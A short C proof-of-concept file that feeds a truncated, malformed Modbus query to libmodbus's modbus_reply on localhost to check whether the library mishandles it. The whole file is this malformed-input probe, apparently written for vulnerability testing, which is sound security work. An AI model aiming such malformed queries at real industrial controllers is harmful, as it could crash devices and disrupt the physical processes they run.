// File: modbus_reply_poc.c
#include <modbus/modbus.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

int main() {
    modbus_t *ctx;
    uint8_t query[MODBUS_TCP_MAX_ADU_LENGTH];
    modbus_mapping_t *mb_mapping;

    // Create a TCP context (localhost:1502)
    ctx = modbus_new_tcp("127.0.0.1", 1502);
    if (!ctx) {
        perror("modbus_new_tcp");
        return -1;
    }

    // Disable debug to reduce output noise
    modbus_set_debug(ctx, 0);

    // Create dummy mapping (simple registers)
    mb_mapping = modbus_mapping_new(10, 10, 10, 10);
    if (!mb_mapping) {
        fprintf(stderr, "Failed to allocate mapping: %s\n", modbus_strerror(errno));
        modbus_free(ctx);
        return -1;
    }

    // Simulate a malicious query (too short or malformed)
    // For example: function code 0x03, but only 3 bytes total (normally requires 5+)
    query[0] = 0x01;  // Unit ID
    query[1] = 0x03;  // Function code
    query[2] = 0x00;  // Supposedly high byte of address (incomplete)

    int rc = modbus_reply(ctx, query, 3, mb_mapping);  // vulnerable?
    if (rc == -1) {
        perror("modbus_reply failed");
    } else {
        printf("modbus_reply returned: %d\n", rc);
    }

    modbus_mapping_free(mb_mapping);
    modbus_free(ctx);
    return 0;
}
